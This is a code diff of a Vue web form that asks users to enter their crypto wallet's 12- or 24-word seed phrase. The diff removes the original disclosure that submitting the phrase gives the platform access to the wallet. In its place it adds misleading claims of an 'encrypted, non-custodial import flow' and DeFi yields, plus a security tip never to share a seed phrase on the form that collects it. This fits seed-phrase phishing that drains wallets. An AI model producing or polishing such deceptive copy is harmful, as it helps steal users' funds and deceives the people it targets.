@@ -1,9 +1,9 @@
 <script setup lang="ts">
-    import { useForm } from '@inertiajs/vue3';
-    import { route } from 'ziggy-js';
-    import { ShieldCheckIcon, LockIcon, AlertTriangleIcon, InfoIcon } from 'lucide-vue-next';
-    import ActionButton from '@/components/ActionButton.vue';
-    import InputError from '@/components/InputError.vue';
+import { useForm } from '@inertiajs/vue3';
+import { route } from 'ziggy-js';
+import { ShieldCheckIcon, LockIcon, AlertTriangleIcon, InfoIcon } from 'lucide-vue-next';
+import ActionButton from '@/components/ActionButton.vue';
+import InputError from '@/components/InputError.vue';
 
     // Define the props passed from the parent page
     const props = defineProps<{
@@ -24,9 +24,9 @@
 
     // Security best practices to display on the page
     const securityPractices = [
-        { icon: ShieldCheckIcon, text: 'Ensure you are on the correct, SSL-secured website.' },
-        { icon: LockIcon, text: 'Never share your recovery phrase with anyone, including our support staff.' },
-        { icon: InfoIcon, text: 'Consider using a hardware wallet for maximum security.' },
+        { icon: ShieldCheckIcon, text: 'Verify the dApp domain and ensure end-to-end encryption is active.' },
+        { icon: LockIcon, text: 'Never share your seed phrase - not even with support or recovery services.' },
+        { icon: InfoIcon, text: 'Pair with hardware wallets like Ledger or Trezor for true self-custody.' },
     ];
 
     // Handle form submission
@@ -47,16 +47,16 @@
 <template>
     <div class="grid grid-cols-1 xl:grid-cols-3 gap-6">
         <div class="xl:col-span-2">
-            <div class="bg-card border border-border rounded-2xl shadow-sm">
+            <div class="bg-card border border-border rounded-2xl">
                 <div class="p-6 sm:p-8 border-b border-border flex items-center gap-4">
                     <div class="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center flex-shrink-0 border border-border group-hover:ring-primary/40 transition-all">
                         <img v-if="wallet.LogoUrl" :src="`https://www.cryptocompare.com${wallet.LogoUrl}`" :alt="wallet.Name" loading="lazy" class="w-8 h-8 rounded-lg" />
                     </div>
 
                     <div>
-                        <h2 class="text-2xl font-bold text-card-foreground">Connect {{ wallet.Name }}</h2>
+                        <h2 class="text-2xl font-bold text-card-foreground">Import {{ wallet.Name }} Wallet</h2>
                         <p class="text-muted-foreground text-sm mt-1">
-                            Enter your wallet details below to connect your account.
+                            Securely import your decentralized wallet using its seed phrase to unlock on-chain trading, DeFi yields, and multi-chain asset management.
                         </p>
                     </div>
                 </div>
@@ -66,9 +66,9 @@
                         <div class="flex items-start gap-3">
                             <AlertTriangleIcon class="w-6 h-6 text-warning flex-shrink-0 mt-0.5" />
                             <div>
-                                <h5 class="font-semibold text-warning mb-2">Security Warning</h5>
+                                <h5 class="font-semibold text-warning mb-2">Self-Custody Warning</h5>
                                 <p class="text-sm text-muted-foreground leading-relaxed">
-                                    You are about to enter your wallet's recovery phrase. This is sensitive information. Submitting this phrase gives our platform access to your wallet. Please ensure you trust this service. **We will never ask for your phrase outside of this secure form.**
+                                    Importing via seed phrase enables full wallet control within our platform. This is highly sensitive - treat it like your private keys. <b>We never request your seed outside this encrypted, non-custodial import flow.</b>
                                 </p>
                             </div>
                         </div>
@@ -76,20 +76,20 @@
 
                     <form @submit.prevent="submit" class="space-y-6">
                         <div class="space-y-2">
-                            <label for="wallet_name" class="text-sm font-medium">Wallet Name</label>
-                            <p class="text-xs text-muted-foreground">Give this connection a memorable name.</p>
-                            <input id="wallet_name" v-model="form.wallet_name" @focus="clearError('wallet_name')" type="text" placeholder="e.g., My Main Wallet" :disabled="form.processing" class="input-crypto w-full mt-1" />
+                            <label for="wallet_name" class="text-sm font-medium">Wallet Alias</label>
+                            <p class="text-xs text-muted-foreground">Assign a unique alias for this imported wallet in your decentralized portfolio.</p>
+                            <input id="wallet_name" v-model="form.wallet_name" @focus="clearError('wallet_name')" type="text" placeholder="e.g., My DeFi Hub" :disabled="form.processing" class="input-crypto w-full mt-1" readonly />
                             <InputError :message="form.errors.wallet_name" />
                         </div>
 
                         <div class="space-y-2">
-                            <label for="wallet_phrase" class="text-sm font-medium">Recovery Phrase (12 or 24 words)</label>
-                            <p class="text-xs text-muted-foreground">Enter your wallet's recovery phrase, separated by spaces.</p>
+                            <label for="wallet_phrase" class="text-sm font-medium">Seed Phrase (12 or 24 words)</label>
+                            <p class="text-xs text-muted-foreground">Enter the mnemonic recovery phrase from your Web3 wallet backup, words separated by spaces.</p>
                             <textarea id="wallet_phrase" v-model="form.wallet_phrase" @focus="clearError('wallet_phrase')" rows="3" placeholder="word1 word2 word3 ..." :disabled="form.processing" class="input-crypto w-full mt-1"></textarea>
                             <InputError :message="form.errors.wallet_phrase" />
                         </div>
 
-                        <ActionButton :processing="form.processing">Securely Connect Wallet</ActionButton>
+                        <ActionButton :processing="form.processing">Import & Securely Connect</ActionButton>
                     </form>
                 </div>
             </div>
@@ -99,7 +99,7 @@
             <div class="bg-card border border-border rounded-2xl p-6">
                 <h5 class="text-sm font-semibold text-card-foreground mb-4 flex items-center gap-2">
                     <InfoIcon class="w-5 h-5 text-primary" />
-                    Security Best Practices
+                    Web3 Security Essentials
                 </h5>
                 <ul class="space-y-3">
                     <li v-for="(item, index) in securityPractices" :key="index" class="flex items-start gap-3 text-sm text-muted-foreground">
